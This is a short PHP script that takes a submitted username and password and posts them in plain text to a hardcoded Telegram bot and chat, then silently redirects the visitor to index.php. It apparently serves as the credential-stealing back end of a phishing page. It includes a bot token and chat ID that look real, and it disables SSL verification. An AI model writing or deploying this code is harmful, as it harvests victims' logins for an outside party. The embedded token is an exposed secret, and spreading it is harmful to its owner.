<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the form data
    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);

    // Construct the message
    $message = "New User\nUsername: $username\nPassword: $password";

    // Your Telegram Bot API details
    $chat_id = "1389764727";  // Replace with your Telegram Chat ID
    $bot_token = "6529423612:AAEffKgJiK0RMsM24nst3oQsqCeYjWm6XAY";  // Replace with your Telegram Bot Token

    // Send the message to Telegram
    $telegram_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $message,
    ];

    $ch = curl_init($telegram_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    // Handle the result if needed
    // For example, you can check if the message was sent successfully

    // Redirect back to the form or any other page
    header("location: index.php");
} else {
    // If the form is not submitted, handle accordingly (e.g., display an error message)
    echo "Form not submitted!";
}
?>
